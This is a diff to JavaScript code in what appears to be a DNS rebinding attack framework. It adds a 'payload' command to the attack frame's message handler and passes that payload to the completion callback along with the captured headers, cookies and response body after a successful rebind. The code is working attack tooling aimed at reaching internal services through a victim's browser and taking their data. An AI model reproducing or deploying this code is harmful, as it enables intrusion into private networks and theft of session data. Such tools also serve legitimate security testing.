@@ -11,6 +11,7 @@ const Rebinder = () => {
     var sessionid = null;
     var flushdns = null;
     let xhr = null;
+    let payload = null;
     let interval = 60000;
 
     function initCommsWithParentFrame() {
@@ -18,6 +19,9 @@ const Rebinder = () => {
             console.log("attack frame", window.location.hostname, "received message", e.data.cmd);
 
             switch (e.data.cmd) {
+                case "payload":
+                    payload = e.data.param;
+                    break;
                 case "interval":
                     interval = parseInt(e.data.param) * 1000;
                     break;
@@ -94,11 +98,11 @@ const Rebinder = () => {
                 // Terminate the attack
                 const rebindingStatusEl = document.getElementById('rebindingstatus');
                 rebindingStatusEl.innerText = `DNS rebinding successful!`;
-                rebindingDoneFn(headers, cookie, body);
+                rebindingDoneFn(payload, headers, cookie, body);
             })
             .catch(function (error) {
                 if (error instanceof TypeError) { // We cannot establish an HTTP connection
-                    console.log("frame " + window.location.hostname + " could not load");
+                    console.log("frame " + window.location.hostname + " could not load: " + error);
                     window.parent.postMessage({
                         status: "error",
                     }, "*");
@@ -111,7 +115,7 @@ const Rebinder = () => {
                     window.parent.postMessage({
                         status: "requiresHttpAuthentication",
                     }, "*");
-                    rebindingDoneFn(headers, cookie, null);
+                    rebindingDoneFn(payload, headers, cookie, null);
                 } else { // We did not handle something
                     console.log('Unhandled error: ' + error);
                     window.parent.postMessage({
@@ -379,4 +383,4 @@ function httpHeaderstoText(headers) {
     return out;
 }
 
-let Registry = [];
+let Registry = {};
